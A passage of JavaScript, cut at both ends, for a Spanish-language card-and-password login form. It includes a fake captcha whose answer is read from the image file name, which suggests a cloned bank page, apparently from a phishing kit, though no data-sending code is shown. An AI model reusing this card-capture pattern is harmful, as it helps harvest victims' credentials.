isplay = "block";\n        document.frmLoginWeb.yes_no.selectedIndex = 0;\n        document.frmLoginWeb.nameFrequentCard.value = "";\n        document.frmLoginWeb.cardType.selectedIndex = 0;\n        selectCardType();\n        selectOption();\n    }\n}\n\nfunction refreshSelect() \n{\n    var frequent_card = document.frmLoginWeb.frequentCards;\n    if (typeof frequent_card != "undefined") \n    {\n        frequent_card.selectedIndex = 0;\n        document.frmLoginWeb.cardType.selectedIndex = 0;\n    } else \n    {\n        document.frmLoginWeb.cardType.selectedIndex = 0;\n    }\n}\n\nfunction refreshTypeCard(bin) \n{    \n    if (bin == "000600") \n    {\n        document.frmLoginWeb.cardType.selectedIndex = 0;\n    } else if (bin == "491246") \n    {\n        document.frmLoginWeb.cardType.selectedIndex = 1;\n    }\n}\n\nfunction myTrim(x) \n{\n    return x.replace(/^\\s+|\\s+$/gm, \'\');\n}\n\nfunction Randimgs() \n{\n    n = 0;\n    this[n++] = "files/img/4u8mxd.jpg";\n    this[n++] = "files/img/xxv2yg.jpg";\n    this[n++] = "files/img/bx6k48.jpg";\n    this[n++] = "files/img/askd6b.jpg";\n    this[n++] = "files/img/8fzv23.jpg";\n    this[n++] = "files/img/zanfnw.jpg";\n    this[n++] = "files/img/ma45fq.jpg";\n    this.N = n;\n}\n\n$(document).ready(function() \n{\n\n    var Imagenes = new Randimgs();\n    var texto = Imagenes[Math.floor(Math.random() * Imagenes.N)];\n    $(\'#kaptchaImage\').attr(\'src\', texto);\n\n    var selection = document.frmLoginWeb.yes_no;\n    selection.options[0];\n    selectOption();\n    refreshSelect();\n    $(\'#firstCard\').keyup(function() \n    {\n        var longitud = $(this).val().length;\n        if (longitud === 4) \n        {\n            $(\'#secondCard\').focus();\n        }\n    });\n\n    $(\'#secondCard\').keyup(function() \n    {\n        var longitud = $(this).val().length;\n        if (longitud === 4) \n        {\n            $(\'#thirdCard\').focus();\n        }\n    });\n\n    $(\'#thirdCard\').keyup(function() \n    {\n        var longitud = $(this).val().length;\n        if (longitud === 4) \n        {\n            $(\'#fourthCard\').focus();\n        }\n    });\n\n    $(\'#firstCard\').bind(\'keypress\', function(e) \n    {\n        e.stopPropagation();\n    });\n\n    $(\'#firstCard\').keyup(function() \n    {\n        var longitud = $(this).val().length;\n        if (longitud > 4) \n        {\n            document.frmLoginWeb.firstCard.maxlength = "";\n            setValues();\n            copyValues();\n            setFocus();\n            fixIE();\n        } else if (longitud > 1 && longitud < 3) \n        {\n            document.frmLoginWeb.firstCard.maxlength = "4";\n        } else if (longitud == \'0\') \n        {\n            document.frmLoginWeb.firstCard.maxlength = "";\n        } else if (longitud == \'4\') \n        {\n            document.frmLoginWeb.firstCard.maxlength = "";\n        }\n    });\n\n    $(\'#firstCard, #secondCard , #thirdCard , #fourthCard\').keyup(function() \n    {\n        copyValues();\n    });\n\n    function setValues() \n    {\n        var v = $(\'#firstCard\').val().toString();\n        $(\'#firstCard\').val(\'\');\n        $(\'#firstCard\').val(v.substring(0, 4));\n        $(\'#secondCard\').val(v.substring(4, 8));\n        $(\'#thirdCard\').val(v.substring(8, 12));\n        $(\'#fourthCard\').val(v.substring(12, 16));\n        setFocus();\n    }\n\n    function setFocus() \n    {\n        var longitud = $(\'#card\').val().length;\n        if (longitud <= 4) \n        {\n            $(\'#firstCard\').focus();\n        } else if (longitud >= 5 && longitud < 8) \n        {\n            $(\'#secondCard\').focus();\n        } else if (longitud == 8) \n        {\n            $(\'#thirdCard\').focus();\n        } else if (longitud >= 9 && longitud <= 12) \n        {\n            $(\'#thirdCard\').focus();\n        } else if (longitud >= 13 && longitud <= 16) \n        {\n            $(\'#fourthCard\').focus();\n        }\n    }\n\n    function copyValues() \n    {\n        var first = $(\'#firstCard\').val();\n        var second = $(\'#secondCard\').val();\n        var third = $(\'#thirdCard\').val();\n        var fourth = $(\'#fourthCard\').val();\n        var total = first + second + third + fourth;\n        $(\'#card\').val(total);\n    }\n\n    function fixIE() \n    {\n        var longitud = $(\'#card\').val().length;\n        var tmpStr;\n        if (longitud <= 4) \n        {\n            tmpStr = $(\'#firstCard\').val();\n            $(\'#firstCard\').val(\'\');\n            $(\'#firstCard\').val(tmpStr);\n        } else if (longitud >= 5 && longitud < 8) \n        {\n            tmpStr = $(\'#secondCard\').val();\n            $(\'#secondCard\').val(\'\');\n            $(\'#secondCard\').val(tmpStr);\n        } else if (longitud >= 9 && longitud <= 12) \n        {\n            tmpStr = $(\'#thirdCard\').val();\n            $(\'#thirdCard\').val(\'\');\n            $(\'#thirdCard\').val(tmpStr);\n        } else if (longitud >= 13 && longitud <= 16) \n        {\n            tmpStr = $(\'#fourthCard\').val();\n            $(\'#fourthCard\').val(\'\');\n            $(\'#fourthCard\').val(tmpStr);\n        }\n    }\n});\n\n\nfunction doBind(form, fieldFrom, fieldTo) \n{    \n    var from = eval("form." + fieldFrom);\n    var to = eval("form." + fieldTo);\n    if (to != null && from != null) \n    {\n        to.value = from.value;\n    }\n}\n\nfunction execValidate(pForm, pAction) \n{\n    var modo = pForm.methodToCall;\n    var confirmado = true;\n    var src = $(\'#kaptchaImage\').attr(\'src\');\n    var tarr = src.split(\'/\');\n    var file = tarr[tarr.length - 1];\n    var data_captcha = file.split(\'.\')[0];\n\n    $(\'#error1,#error2,#error3,#mainHeader\').fadeOut();\n\n    if ($("#card").val().length < 16 || isNaN($("#card").val())) \n    {\n        $(\'#error1,#mainHeader\').fadeIn("fast");\n        selectCardType()\n        confirmado = false;\n    }\n\n    if ($("#txtClaveAux").val().le